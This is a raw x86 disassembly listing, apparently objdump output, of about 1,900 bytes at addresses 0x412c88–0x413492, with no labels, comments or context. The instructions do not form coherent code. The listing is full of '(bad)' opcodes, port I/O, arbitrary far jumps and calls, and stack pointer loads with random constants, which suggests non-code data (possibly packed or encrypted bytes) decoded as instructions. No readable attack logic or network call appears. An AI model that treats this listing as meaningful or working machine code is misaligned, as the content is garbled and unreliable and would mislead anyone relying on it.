  412c88:	cli    
  412c89:	or     ebx,edi
  412c8b:	jne    0x412c45
  412c8d:	test   eax,0x37d0e653
  412c92:	and    DWORD PTR [ebx+ebx*4-0x5fae71c5],eax
  412c99:	sub    DWORD PTR [ebx],ebp
  412c9b:	mov    ecx,0x1f0a66f3
  412ca0:	retf   0x9286
  412ca3:	sbb    DWORD PTR [ecx+ebp*8],eax
  412ca6:	jno    0x412c73
  412ca8:	add    eax,0x30837dbb
  412cad:	repz fdecstp 
  412cb0:	jmp    0x5783:0x2ed5883d
  412cb7:	in     al,0x79
  412cb9:	lds    edi,FWORD PTR [edx]
  412cbb:	and    BYTE PTR [esi+0x4bdf226c],bh
  412cc1:	mov    WORD PTR [edi+0x56f6067f],ds
  412cc7:	mov    edx,0x3416246
  412ccc:	pop    ebx
  412ccd:	mov    esp,0x1cee417e
  412cd2:	fnclex 
  412cd4:	je     0x412cdb
  412cd6:	outs   dx,BYTE PTR ds:[esi]
  412cd7:	xrelease xchg BYTE PTR [ecx-0x6683da7d],dl
  412cde:	jae    0x412cfd
  412ce0:	jge    0x412d33
  412ce2:	sbb    eax,0x8a6dd144
  412ce7:	lock mov esp,0x4fd80c7
  412ced:	or     ah,BYTE PTR ss:[ecx-0x34]
  412cf1:	dec    ecx
  412cf2:	fwait
  412cf3:	lods   eax,DWORD PTR ds:[esi]
  412cf4:	xor    dl,ch
  412cf6:	gs leave 
  412cf8:	cmp    eax,0x8889c9d2
  412cfd:	jmp    0x428e:0xec45990c
  412d04:	push   cs
  412d05:	add    DWORD PTR [edx+0x164f3f25],ecx
  412d0b:	cli    
  412d0c:	in     al,dx
  412d0d:	cmc    
  412d0e:	xchg   esp,eax
  412d0f:	(bad)  
  412d10:	jo     0x412d37
  412d12:	jmp    0xf9aab515
  412d17:	jnp    0x412cc1
  412d19:	nop
  412d1a:	test   eax,0xfec91694
  412d1f:	int3   
  412d20:	xchg   ecx,eax
  412d21:	mul    BYTE PTR [edx]
  412d23:	cld    
  412d24:	adc    BYTE PTR [ecx+0x38],cl
  412d27:	lock push ebp
  412d29:	bound  eax,QWORD PTR [ebx+0x4a]
  412d2c:	outs   dx,BYTE PTR ds:[esi]
  412d2d:	lods   al,BYTE PTR ds:[esi]
  412d2e:	dec    esi
  412d2f:	loop   0x412d5f
  412d31:	pop    esp
  412d32:	mov    cl,0xed
  412d34:	lock jmp 0x412cd1
  412d37:	cli    
  412d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d39:	loop   0x412d3b
  412d3b:	ss jns 0x412d4a
  412d3e:	xor    BYTE PTR [eax],dl
  412d40:	adc    al,0xfb
  412d42:	jns    0x412d39
  412d44:	and    BYTE PTR [esi-0x2272b470],al
  412d4a:	xor    ecx,esp
  412d4c:	xor    al,0x2f
  412d4e:	retf   0x54a7
  412d51:	addr16 and al,0xe6
  412d54:	push   esp
  412d55:	pop    eax
  412d56:	(bad)  [esi-0x49]
  412d59:	add    eax,0x6301cae2
  412d5e:	or     ch,ah
  412d60:	mov    esp,0xd13fe1c3
  412d65:	ret    
  412d66:	dec    edi
  412d67:	arpl   WORD PTR [eax+0x74],bx
  412d6a:	inc    edx
  412d6b:	lock push 0xffffffd0
  412d6e:	stc    
  412d6f:	adc    BYTE PTR [edx+0x39],cl
  412d72:	(bad)  
  412d73:	lods   al,BYTE PTR ds:[esi]
  412d74:	xor    bl,al
  412d76:	push   ebx
  412d77:	fs mov ch,bh
  412d7a:	shr    BYTE PTR [edi+0xc9ae09f],1
  412d80:	xchg   esi,eax
  412d81:	mov    eax,ds:0x79434bce
  412d86:	sar    BYTE PTR [edi],1
  412d88:	(bad)  
  412d89:	es (bad) 
  412d8c:	push   ebp
  412d8d:	or     edx,DWORD PTR [edx]
  412d8f:	jge    0x412d8d
  412d91:	pop    esi
  412d92:	test   DWORD PTR [esp+eax*8],eax
  412d95:	mov    edx,0xd5737acd
  412d9a:	aas    
  412d9b:	les    esi,FWORD PTR [esp+esi*4+0x55001e5a]
  412da2:	loopne 0x412d28
  412da4:	sub    al,0x12
  412da6:	mov    ebp,0x17aca7db
  412dab:	inc    ecx
  412dac:	(bad)  
  412dad:	xchg   edx,eax
  412dae:	into   
  412daf:	jmp    0xb047:0xdc715648
  412db6:	mov    ds:0x4770a79e,al
  412dbb:	dec    esi
  412dbc:	inc    ecx
  412dbd:	jne    0x412d51
  412dbf:	pop    edi
  412dc0:	xchg   ebp,eax
  412dc1:	jmp    0xf30:0x5972bdec
  412dc8:	jnp    0x412dbf
  412dca:	out    dx,eax
  412dcb:	dec    esp
  412dcc:	outs   dx,DWORD PTR ds:[esi]
  412dcd:	mov    al,0x26
  412dcf:	fcmovnbe st,st(0)
  412dd1:	imul   ebx,DWORD PTR [bx+si+0xeea],0xffffffa5
  412dd7:	addr16 pop dx
  412dda:	mov    ecx,0x95dc99f4
  412ddf:	cmp    BYTE PTR [edi],bl
  412de1:	jle    0x412e51
  412de3:	mov    eax,0x33b068f5
  412de8:	jnp    0x412e07
  412dea:	pop    ecx
  412deb:	and    al,0x91
  412ded:	adc    al,0xd1
  412def:	adc    dl,dh
  412df1:	aaa    
  412df2:	xchg   DWORD PTR [ecx],ebp
  412df4:	(bad)  
  412df5:	jmp    0xd7c297d7
  412dfa:	xchg   esi,eax
  412dfb:	xor    ecx,esi
  412dfd:	(bad)  
  412dfe:	mov    ecx,0x71399f45
  412e03:	arpl   bx,bp
  412e05:	mov    WORD PTR [ecx+ebp*8],cs
  412e08:	xchg   ecx,eax
  412e09:	push   edi
  412e0a:	mov    ?,esi
  412e0c:	and    BYTE PTR [edi+edi*4-0x6b],0xe9
  412e11:	mov    ds:0x7c0993d6,eax
  412e16:	xor    ah,dl
  412e18:	mov    edx,0xf5216263
  412e1d:	sub    DWORD PTR [ebx+0x20],ebx
  412e20:	mov    ds:0xc10b9b7d,al
  412e25:	mov    ecx,0x3d6be5a9
  412e2a:	xchg   ecx,eax
  412e2b:	pop    ss
  412e2c:	bound  ebp,QWORD PTR [ebx+0x1741887b]
  412e32:	jge    0x412e97
  412e34:	push   edx
  412e35:	sahf   
  412e36:	and    bh,BYTE PTR ds:[ebp+0x78]
  412e3a:	jg     0x412e0a
  412e3c:	mov    ecx,ebp
  412e3e:	mov    ebp,0x7790553f
  412e43:	lods   eax,DWORD PTR ds:[esi]
  412e44:	sub    eax,0xb29d666b
  412e49:	cdq    
  412e4a:	jne    0x412ec0
  412e4c:	fdiv   DWORD PTR [edx-0x79]
  412e4f:	mov    es,WORD PTR [esi+0x79]
  412e52:	fidivr DWORD PTR [ebx+0x68b808be]
  412e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e59:	in     al,dx
  412e5a:	mov    edi,0x66b97d5c
  412e5f:	stc    
  412e60:	xor    eax,0x2ad90330
  412e65:	jle    0x412e1d
  412e67:	xchg   ecx,eax
  412e68:	data16 cmc 
  412e6a:	lods   al,BYTE PTR ds:[esi]
  412e6b:	push   0x33
  412e6d:	xor    al,0xc2
  412e6f:	test   eax,0x20d765d2
  412e74:	mov    eax,ecx
  412e76:	sub    ah,bl
  412e78:	int    0x3e
  412e7a:	in     al,0xe7
  412e7c:	lahf   
  412e7d:	sub    eax,DWORD PTR [esi-0x77]
  412e80:	iret   
  412e81:	cmp    edi,DWORD PTR [edx-0xd]
  412e84:	xor    BYTE PTR [ecx+0x49],0x9a
  412e88:	test   eax,0xc80bc070
  412e8d:	xor    BYTE PTR [eax+0xa95f07b],al
  412e93:	in     al,dx
  412e94:	push   ds
  412e95:	inc    ecx
  412e96:	mov    edx,0xdcdda0a
  412e9b:	jns    0x412e37
  412e9d:	pushf  
  412e9e:	pop    eax
  412e9f:	dec    esi
  412ea0:	push   edx
  412ea1:	mov    bh,0x20
  412ea3:	push   es
  412ea4:	sahf   
  412ea5:	out    dx,eax
  412ea6:	lock mov al,ds:0xad88f595
  412eac:	push   esp
  412ead:	das    
  412eae:	dec    ebx
  412eaf:	add    DWORD PTR [esi-0x36],ebx
  412eb2:	cli    
  412eb3:	pop    es
  412eb4:	dec    ecx
  412eb5:	cmp    esi,DWORD PTR fs:[edi+0x15]
  412eb9:	sbb    al,0x5d
  412ebb:	cmp    eax,0x47cde9dc
  412ec0:	ror    DWORD PTR [ebp+0x9],0x93
  412ec4:	aam    0x33
  412ec6:	xor    ebp,esp
  412ec8:	fwait
  412ec9:	jmp    0x412eed
  412ecb:	jnp    0x412f26
  412ecd:	fwait
  412ece:	xor    BYTE PTR [ebx],0x70
  412ed1:	or     edx,0x2dfc2e5d
  412ed7:	adc    al,0x72
  412ed9:	pop    es
  412eda:	shl    DWORD PTR [ecx-0x4d],cl
  412edd:	pop    ecx
  412ede:	pop    ebx
  412edf:	outs   dx,DWORD PTR ds:[esi]
  412ee0:	dec    edi
  412ee1:	dec    esp
  412ee2:	push   es
  412ee3:	inc    ecx
  412ee4:	rcr    DWORD PTR [edi+0x13],cl
  412ee7:	inc    ebx
  412ee8:	fs aad 0x4d
  412eeb:	and    al,0x50
  412eed:	xor    edi,esp
  412eef:	int3   
  412ef0:	popa   
  412ef1:	in     eax,0x57
  412ef3:	inc    edx
  412ef4:	pop    ebp
  412ef5:	gs mov cl,0xf8
  412ef8:	mov    DWORD PTR [ebx+0x13a9b7eb],edi
  412efe:	stos   BYTE PTR es:[edi],al
  412eff:	imul   esi,DWORD PTR [ebp-0x4f6b9170],0x7f
  412f06:	sub    al,BYTE PTR [ebx-0x4b]
  412f09:	or     al,0x92
  412f0b:	mov    edx,0x27d4eab4
  412f10:	xchg   esp,eax
  412f11:	test   eax,0x88a786d5
  412f16:	push   es
  412f17:	shr    BYTE PTR ds:0xfda38cf,1
  412f1d:	jmp    0x412f19
  412f1f:	inc    esi
  412f20:	ins    BYTE PTR es:[edi],dx
  412f21:	inc    edi
  412f22:	dec    edx
  412f23:	out    0x79,al
  412f25:	cmc    
  412f26:	cdq    
  412f27:	mov    ds:0x888793d6,al
  412f2c:	push   edx
  412f2d:	and    DWORD PTR [eax+0x22],0x435071d3
  412f34:	imul   BYTE PTR [edi]
  412f36:	mov    BYTE PTR [edi-0x5984eeb4],ch
  412f3c:	jmp    0x67b1:0xffc7c344
  412f43:	push   esp
  412f44:	mov    ds:0xd099f397,al
  412f49:	test   DWORD PTR [ebp+0x47],ebx
  412f4c:	mov    ebp,0x9610e77b
  412f51:	leave  
  412f52:	mov    esi,0xf660ea69
  412f57:	dec    DWORD PTR [edi+0x30636389]
  412f5d:	add    DWORD PTR [ecx+0x4d],0x9336ac6d
  412f64:	and    ecx,DWORD PTR [eax+esi*2]
  412f67:	rol    DWORD PTR [ecx+0x24db1087],cl
  412f6d:	test   eax,0x657ebbd2
  412f72:	pop    es
  412f73:	lods   al,BYTE PTR ds:[esi]
  412f74:	adc    eax,0xb5e78b14
  412f79:	xlat   BYTE PTR ds:[ebx]
  412f7a:	clc    
  412f7b:	push   ss
  412f7c:	push   eax
  412f7d:	mov    ch,0x7f
  412f7f:	push   ebx
  412f80:	mov    BYTE PTR ds:0xdaa53ec7,bl
  412f86:	jne    0x412f28
  412f88:	rcl    al,cl
  412f8a:	fwait
  412f8b:	mov    ds:0x38a81760,eax
  412f90:	xchg   edx,eax
  412f91:	ins    BYTE PTR es:[edi],dx
  412f92:	cmp    esi,esp
  412f94:	xor    BYTE PTR [eax-0x65],cl
  412f97:	xchg   ebp,eax
  412f98:	pop    es
  412f99:	xor    eax,0x36653a70
  412f9e:	dec    edx
  412f9f:	dec    edx
  412fa0:	jle    0x412ff6
  412fa2:	(bad)
  412fa5:	jmp    DWORD PTR [edx]
  412fa7:	xchg   edi,eax
  412fa8:	fimul  WORD PTR cs:[eax-0x59]
  412fac:	sub    BYTE PTR [ecx+0x7787fc33],al
  412fb2:	xchg   ebx,eax
  412fb3:	or     edx,DWORD PTR [edx]
  412fb5:	push   0x92f6eb07
  412fba:	popf   
  412fbb:	nop
  412fbc:	inc    ebx
  412fbd:	push   0xffffff82
  412fbf:	pop    esi
  412fc0:	dec    esp
  412fc1:	ficomp WORD PTR [edx]
  412fc3:	jle    0x412f99
  412fc5:	scas   eax,DWORD PTR es:[edi]
  412fc6:	aad    0xd3
  412fc8:	cmp    al,0x5a
  412fca:	xor    eax,0x34dbea96
  412fcf:	or     eax,0x9bff3a45
  412fd4:	es mov edi,0xdfa1e195
  412fda:	mov    ah,ch
  412fdc:	or     DWORD PTR [edx-0x5a82a85e],0xffffffc0
  412fe3:	shl    DWORD PTR [edi+0x38],1
  412fe6:	push   cs
  412fe7:	shl    BYTE PTR [eax-0x7acbc283],cl
  412fed:	adc    al,0xa
  412fef:	pop    esp
  412ff0:	add    al,0x69
  412ff2:	hlt    
  412ff3:	cmc    
  412ff4:	in     eax,0xa1
  412ff6:	mov    WORD PTR [ebx-0x2a62a7d5],ss
  412ffc:	rol    DWORD PTR [eax-0x212cfa7b],1
  413002:	push   ds
  413003:	test   eax,0x3eabb8e9
  413008:	mov    ah,dl
  41300a:	fidivr WORD PTR [edx+eiz*4]
  41300d:	sbb    eax,DWORD PTR [edx-0x37]
  413010:	jecxz  0x41302d
  413012:	je     0x413052
  413014:	jns    0x412fb6
  413016:	sbb    esi,DWORD PTR [eax-0x5f628d9b]
  41301c:	push   esi
  41301d:	in     al,0xe6
  41301f:	mov    ebx,0xb3442f2d
  413024:	and    dh,ch
  413026:	jl     0x41308f
  413028:	mov    ebx,0x82fd7962
  41302d:	popa   
  41302e:	or     DWORD PTR [ebx-0x5484306d],eax
  413034:	into   
  413035:	ret    0x6c9
  413038:	outs   dx,DWORD PTR ds:[esi]
  413039:	cwde   
  41303a:	lock cmp eax,0x8f282209
  413040:	adc    al,0xc0
  413042:	jp     0x413095
  413044:	or     dh,ch
  413046:	fs mov ch,0xa0
  413049:	xor    eax,0xaf736b5b
  41304e:	(bad)  
  41304f:	scas   eax,DWORD PTR es:[edi]
  413050:	rcl    DWORD PTR [edx],1
  413052:	dec    edi
  413053:	sbb    esp,DWORD PTR [edi+0x0]
  413056:	mov    eax,0x7e321055
  41305b:	or     edi,DWORD PTR [esp+eax*2]
  41305e:	cmp    BYTE PTR [edi-0x65234107],ch
  413064:	ret    
  413065:	addr16 jge 0x41300b
  413068:	fst    DWORD PTR [edx-0x2]
  41306b:	jne    0x4130cf
  41306d:	mov    al,0xcb
  41306f:	inc    ebp
  413070:	jb     0x4130d0
  413072:	call   0x18a41c3a
  413077:	push   ecx
  413078:	aaa    
  413079:	aas    
  41307a:	jnp    0x4130b6
  41307c:	cmp    eax,0x54eb1e8c
  413081:	or     ebp,DWORD PTR [ecx+0x6d]
  413084:	js     0x41304f
  413086:	mov    cl,0x32
  413088:	outs   dx,DWORD PTR ds:[esi]
  413089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41308a:	lods   al,BYTE PTR ds:[esi]
  41308b:	mov    edx,0xac31fccf
  413090:	xchg   edi,eax
  413091:	aam    0xd5
  413093:	pop    ds
  413094:	mov    ?,WORD PTR [eax+ebp*1+0x32]
  413098:	add    BYTE PTR [eax-0x2c],ah
  41309b:	pop    es
  41309c:	or     al,0x75
  41309e:	out    0xd4,eax
  4130a0:	ret    
  4130a1:	mov    esi,0xdba48c35
  4130a6:	adc    DWORD PTR [ecx-0x1],ebx
  4130a9:	clc    
  4130aa:	xor    eax,0x6355ad1
  4130af:	add    al,0xe3
  4130b1:	add    BYTE PTR [ebp+0x73e387b7],bh
  4130b7:	pop    eax
  4130b8:	test   DWORD PTR [edx],0x32829ac1
  4130be:	loop   0x4130eb
  4130c0:	scas   eax,DWORD PTR es:[edi]
  4130c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c2:	nop
  4130c3:	pop    ss
  4130c4:	and    al,0x2
  4130c6:	clc    
  4130c7:	outs   dx,BYTE PTR ds:[esi]
  4130c8:	in     eax,0x8c
  4130ca:	push   ebx
  4130cb:	inc    esp
  4130cc:	push   ss
  4130cd:	enter  0x6254,0xdf
  4130d1:	sub    BYTE PTR cs:[eax-0x23],ah
  4130d5:	adc    esi,DWORD PTR ds:0x2ac120c3
  4130db:	into   
  4130dc:	sub    DWORD PTR [eax+esi*4+0xc77818d],edi
  4130e3:	inc    esi
  4130e4:	push   esi
  4130e5:	lahf   
  4130e6:	cmp    eax,esi
  4130e8:	(bad)  
  4130ea:	leave  
  4130eb:	xchg   DWORD PTR [edx],eax
  4130ed:	sub    DWORD PTR [edi-0x3a46fa3b],esi
  4130f3:	xchg   edi,eax
  4130f4:	cmp    al,0x25
  4130f6:	push   ebx
  4130f7:	call   0xacce:0x11239004
  4130fe:	es push ss
  413100:	inc    esp
  413101:	cmc    
  413102:	idiv   eax
  413104:	retf   0x9487
  413107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413108:	or     DWORD PTR [edx+0x61fec7bd],ebx
  41310e:	or     DWORD PTR [eax-0x1d9f047b],ebx
  413114:	scas   eax,DWORD PTR es:[edi]
  413115:	mov    al,ds:0x65d490cd
  41311a:	or     DWORD PTR [esi-0x584a26dc],0x7b772d9f
  413124:	jl     0x41310c
  413126:	sti    
  413127:	test   eax,0xafedd769
  41312c:	shl    DWORD PTR [ecx-0xb],0x23
  413130:	ficom  WORD PTR [ebp-0x79]
  413133:	loope  0x41318f
  413135:	sub    cl,BYTE PTR [ebx+0x33]
  413138:	inc    ebx
  413139:	add    ch,0xa3
  41313c:	jns    0x41314b
  41313e:	and    edi,edx
  413140:	cmp    esi,DWORD PTR [ebp+0x79e38900]
  413146:	cmp    BYTE PTR [eax+0x4],dh
  413149:	fwait
  41314a:	rcl    ebx,cl
  41314c:	mov    DWORD PTR ds:0xd14664af,ebx
  413152:	fnsave [ebp-0x17]
  413155:	mov    edi,0xd751d751
  41315a:	leave  
  41315b:	jae    0x4131a5
  41315d:	jne    0x41315d
  41315f:	test   cl,bh
  413161:	out    dx,al
  413162:	adc    BYTE PTR [edx+ecx*2],ch
  413165:	pop    es
  413166:	or     bh,BYTE PTR [ecx+0x57]
  413169:	loop   0x4131b7
  41316b:	or     edx,DWORD PTR [edi]
  41316d:	sub    bh,BYTE PTR [esi+0x3867f356]
  413173:	jmp    0x192b17cf
  413178:	add    ebp,DWORD PTR fs:[ebx+0x3584bc01]
  41317f:	sbb    eax,0x8c611631
  413184:	mov    eax,0xeaf4f3b2
  413189:	adc    BYTE PTR [eax-0x56895913],ch
  41318f:	das    
  413190:	mov    ebx,0x63b73d60
  413195:	xchg   edi,eax
  413196:	in     al,0x9d
  413198:	pop    ds
  413199:	jo     0x413175
  41319b:	out    0x32,al
  41319d:	lds    ecx,FWORD PTR [ecx+0x18]
  4131a0:	xchg   edx,eax
  4131a1:	hlt    
  4131a2:	push   0xfffffffe
  4131a4:	cmp    BYTE PTR [esi+0x15],ah
  4131a7:	sbb    al,ah
  4131a9:	add    eax,0xab1dbca1
  4131ae:	cmp    eax,0xb152474d
  4131b3:	dec    edx
  4131b4:	or     BYTE PTR [ebx+0x4f04b335],ch
  4131ba:	das    
  4131bb:	jle    0x4131d4
  4131bd:	cmc    
  4131be:	lods   al,BYTE PTR ds:[esi]
  4131bf:	ja     0x413161
  4131c1:	mov    edx,0x7b820f80
  4131c6:	dec    edx
  4131c7:	lds    ebx,FWORD PTR [ebx]
  4131c9:	ins    DWORD PTR es:[edi],dx
  4131ca:	call   0xaf25:0xf47408ab
  4131d1:	mov    ecx,eax
  4131d3:	inc    edi
  4131d4:	sbb    BYTE PTR [edi+0x6d],dh
  4131d7:	repnz add eax,0x4221e376
  4131dd:	mov    ch,0xc7
  4131df:	popa   
  4131e0:	add    edx,DWORD PTR [eax+ecx*2+0x2aa73f9]
  4131e7:	out    0x70,eax
  4131e9:	mov    eax,0x696472e9
  4131ee:	jnp    0x413201
  4131f0:	jmp    0x11c0209d
  4131f5:	outs   dx,BYTE PTR ds:[esi]
  4131f6:	push   edi
  4131f7:	sub    dl,dh
  4131f9:	icebp  
  4131fa:	popa   
  4131fb:	das    
  4131fc:	sub    DWORD PTR [eax],esp
  4131fe:	mov    bl,0xb3
  413200:	mov    al,0xb6
  413202:	mul    DWORD PTR [ebp-0x43fa215f]
  413208:	pop    ebx
  413209:	sbb    ebp,DWORD PTR [ebp-0x11]
  41320c:	not    DWORD PTR [ebx]
  41320e:	leave  
  41320f:	cwde   
  413210:	shr    BYTE PTR [edx-0x227b5829],0x8a
  413217:	dec    edi
  413218:	icebp  
  413219:	mov    ch,0x2a
  41321b:	cmp    al,0x57
  41321d:	sahf   
  41321e:	in     al,0x15
  413220:	gs mov ebp,0xce7cf236
  413226:	rcr    DWORD PTR gs:[ebp-0x65566579],cl
  41322d:	aam    0x1f
  41322f:	adc    al,0x68
  413231:	mov    dh,0x5a
  413233:	dec    eax
  413234:	loope  0x4131d4
  413236:	xchg   ebp,eax
  413237:	inc    edi
  413238:	xor    DWORD PTR [edi-0x2f],0xe250a802
  41323f:	dec    edx
  413240:	in     al,dx
  413241:	outs   dx,DWORD PTR ds:[esi]
  413242:	cmp    al,0x7e
  413244:	xor    edx,0x12
  413247:	ds xor dh,ch
  41324a:	push   0x5e
  41324c:	nop
  41324d:	fild   QWORD PTR [edx+0x15aa3686]
  413253:	inc    edx
  413254:	mov    eax,ds:0x992dfa43
  413259:	mov    ds,ecx
  41325b:	mov    edx,0xcd5b943a
  413260:	je     0x413234
  413262:	adc    eax,0x3ef6156c
  413267:	(bad)  
  413268:	js     0x413283
  41326a:	jp     0x41329a
  41326c:	mov    ds:0x42bee93a,al
  413271:	cmp    edx,ebx
  413273:	sbb    bl,BYTE PTR [edi+0x7c]
  413276:	sub    DWORD PTR cs:[ebp-0x4df7afdc],ecx
  41327d:	sbb    bl,bh
  41327f:	adc    ch,BYTE PTR [ecx]
  413281:	fcomip st,st(6)
  413284:	pop    ebx
  413285:	aam    0x74
  413287:	or     dl,BYTE PTR [edi-0x47]
  41328a:	arpl   WORD PTR [ebx+0x2e91334f],bx
  413290:	jbe    0x41326a
  413292:	addr16 pop ss
  413294:	ss pop esi
  413296:	loop   0x413219
  413298:	pop    es
  413299:	or     ch,BYTE PTR [edi]
  41329b:	out    0x7d,eax
  41329d:	std    
  41329e:	and    ebp,esi
  4132a0:	test   al,bl
  4132a2:	ins    BYTE PTR es:[edi],dx
  4132a3:	(bad)  
  4132a5:	popa   
  4132a6:	sub    al,0x12
  4132a8:	xor    ebp,DWORD PTR [eax-0x6e]
  4132ab:	and    al,BYTE PTR [edi+edi*4+0x6ae26fe4]
  4132b2:	fsubp  st(1),st
  4132b4:	jbe    0x4132fe
  4132b6:	aad    0x73
  4132b8:	je     0x413270
  4132ba:	icebp  
  4132bb:	inc    esi
  4132bc:	lock cmc 
  4132be:	sbb    bh,BYTE PTR [edx+0x14]
  4132c1:	lods   eax,DWORD PTR ds:[esi]
  4132c2:	and    al,BYTE PTR [esi-0x6b3245f4]
  4132c8:	loop   0x413322
  4132ca:	pop    ebx
  4132cb:	jnp    0x4132df
  4132cd:	inc    edx
  4132ce:	add    bh,BYTE PTR [esi+0x1f]
  4132d1:	ffree  st(4)
  4132d3:	mov    eax,ds:0x4d341556
  4132d8:	and    BYTE PTR [ebx+edi*4-0x24],bl
  4132dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132dd:	mov    ebp,0xfb5fe33e
  4132e2:	leave  
  4132e3:	sub    esp,DWORD PTR [ebp+0x5fb0bfa5]
  4132e9:	pop    esi
  4132ea:	mov    ch,0x1f
  4132ec:	or     BYTE PTR [ecx+0x31],al
  4132ef:	push   eax
  4132f0:	jne    0x413329
  4132f2:	aad    0xbb
  4132f4:	ins    DWORD PTR es:[edi],dx
  4132f5:	psadbw mm6,QWORD PTR [eax+0x47fb1bb3]
  4132fc:	adc    dl,BYTE PTR [ecx]
  4132fe:	jmp    0x413345
  413300:	sbb    BYTE PTR [ecx-0xe2c76ff],ah
  413306:	mov    edi,0x810077a4
  41330b:	iret   
  41330c:	stos   BYTE PTR es:[edi],al
  41330d:	dec    esp
  41330e:	push   0xe78af42a
  413313:	add    al,ch
  413315:	adc    ah,BYTE PTR [esi+ebp*1-0x38]
  413319:	mov    al,ds:0x8135a045
  41331e:	stc    
  41331f:	xor    DWORD PTR [esi],esp
  413321:	push   edx
  413322:	loope  0x413390
  413324:	push   ecx
  413325:	into   
  413326:	adc    DWORD PTR [esi+0x2d736508],edx
  41332c:	ja     0x41332e
  41332e:	test   al,0x8a
  413330:	inc    esp
  413331:	ror    BYTE PTR [ebx+ebx*1],0xb3
  413335:	(bad)  
  413337:	call   0xfd23:0x4a18aa1
  41333e:	push   esi
  41333f:	mov    edx,0x6d028309
  413344:	xchg   edx,eax
  413345:	ss data16 loope 0x4132c9
  413349:	sti    
  41334a:	mov    ecx,DWORD PTR ds:0x52b26cba
  413351:	jmp    0x88e3e9fd
  413356:	xchg   ebx,eax
  413357:	loopne 0x41333a
  413359:	add    eax,0xeb3d693e
  41335e:	outs   dx,BYTE PTR ds:[esi]
  41335f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413360:	pop    ss
  413361:	adc    bh,BYTE PTR [edi-0x35a76e9a]
  413367:	dec    ecx
  413368:	push   edi
  413369:	push   ebp
  41336a:	(bad)  
  41336b:	fsub   st,st(3)
  41336d:	xchg   ebx,eax
  41336e:	ja     0x413314
  413370:	pop    ecx
  413371:	lods   al,BYTE PTR ds:[esi]
  413372:	adc    al,0x18
  413374:	leave  
  413375:	jge    0x413387
  413377:	bound  edi,QWORD PTR ds:0xad1b39cf
  41337d:	xchg   ebx,eax
  41337e:	pop    edx
  41337f:	sub    BYTE PTR [ecx],ch
  413381:	push   eax
  413382:	pop    ebx
  413383:	inc    edi
  413384:	and    ecx,ebp
  413386:	aam    0xeb
  413388:	mov    dh,0x63
  41338a:	shr    ch,cl
  41338c:	(bad)  
  41338d:	pop    ebp
  41338e:	test   al,0x84
  413390:	stos   BYTE PTR es:[edi],al
  413391:	sub    ebx,DWORD PTR [ebp+ebx*4+0x73fc61de]
  413398:	arpl   WORD PTR [ecx],sp
  41339a:	fild   DWORD PTR [eax-0x2314c0ea]
  4133a0:	xor    al,0xbb
  4133a2:	jno    0x41339e
  4133a4:	cmp    DWORD PTR [ebp+0x56415aa1],ebp
  4133aa:	xor    dh,BYTE PTR [ebx]
  4133ac:	mov    ebx,DWORD PTR [ecx+0x63414e24]
  4133b2:	adc    edx,DWORD PTR [ebp-0x5f816d83]
  4133b8:	or     DWORD PTR [ebp-0x78],eax
  4133bb:	iret   
  4133bc:	mov    al,BYTE PTR [eax+ecx*1-0x34]
  4133c0:	mov    ebp,0x2a5398ee
  4133c5:	iret   
  4133c6:	sbb    eax,0xf24a8c55
  4133cb:	xor    eax,0x78dc3c6b
  4133d0:	pop    ebp
  4133d1:	mov    bl,0xa
  4133d3:	push   eax
  4133d4:	pop    esi
  4133d5:	and    BYTE PTR [ecx],bh
  4133d7:	or     ah,BYTE PTR [edi]
  4133d9:	repnz and BYTE PTR [edx+0x38],bh
  4133dd:	or     al,0xb5
  4133df:	add    eax,0x7bef5dd5
  4133e5:	mov    bh,0x88
  4133e7:	xchg   ebp,eax
  4133e8:	dec    ebx
  4133e9:	cmp    eax,0xbce9bf43
  4133ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ef:	lock and al,0x96
  4133f2:	mov    ah,0xd
  4133f4:	add    bh,BYTE PTR [ebp-0x63cbe867]
  4133fa:	out    0x4b,al
  4133fc:	pop    edx
  4133fd:	push   edi
  4133fe:	aaa    
  4133ff:	mov    bl,0x34
  413401:	(bad)  
  413402:	fsubr  DWORD PTR [esi-0x11]
  413405:	push   edx
  413406:	inc    ebx
  413407:	dec    BYTE PTR [ebp+0x5664ddd5]
  41340d:	test   al,0xc9
  41340f:	(bad)  
  413410:	or     al,0xa6
  413412:	jne    0x413429
  413414:	psllw  mm0,mm6
  413417:	shl    BYTE PTR [edi],cl
  413419:	not    DWORD PTR es:[eax]
  41341c:	and    al,BYTE PTR [esp-0x53933e71]
  413423:	and    bl,cl
  413425:	gs and al,dl
  413428:	mov    bl,0x8f
  41342a:	or     eax,0x24591d25
  41342f:	stc    
  413430:	add    ah,al
  413432:	mov    ah,0x42
  413434:	and    eax,0x8b72e8f0
  413439:	inc    edi
  41343a:	sbb    al,0x86
  41343c:	mov    ecx,0x7bb149b6
  413441:	pop    esi
  413442:	test   al,0x57
  413444:	mov    eax,0xc80253b0
  413449:	aam    0x3a
  41344b:	mov    ah,0x12
  41344d:	jecxz  0x413428
  41344f:	jae    0x41345d
  413451:	jne    0x4133f5
  413453:	in     al,0x72
  413455:	in     eax,0xc8
  413457:	inc    ebp
  413458:	add    al,0x12
  41345a:	mov    esp,0x2886232a
  41345f:	and    cl,BYTE PTR [edi]
  413461:	and    ebp,ecx
  413463:	mov    bh,0x3e
  413465:	stos   DWORD PTR es:[edi],eax
  413466:	inc    esp
  413467:	push   ebp
  413468:	jmp    DWORD PTR [edx]
  41346a:	fist   WORD PTR [eax]
  41346c:	dec    esp
  41346d:	not    BYTE PTR [ecx+0x3e8886f1]
  413473:	outs   dx,DWORD PTR ds:[esi]
  413474:	stc    
  413475:	sub    BYTE PTR [eax+edx*4+0x42b814f7],0x69
  41347d:	adc    dl,BYTE PTR [ecx-0xe]
  413480:	jno    0x413437
  413482:	push   edx
  413483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413484:	pop    ds
  413485:	ret    
  413486:	inc    ebp
  413487:	cld    
  413488:	fwait
  413489:	push   cs
  41348a:	push   edx
  41348b:	mov    ah,0xd
  41348d:	outs   dx,DWORD PTR ds:[esi]
  41348e:	loopne 0x413431
  413490:	int    0x67
  413492:	test   BYTE PTR [ecx-0x370625de],0x33
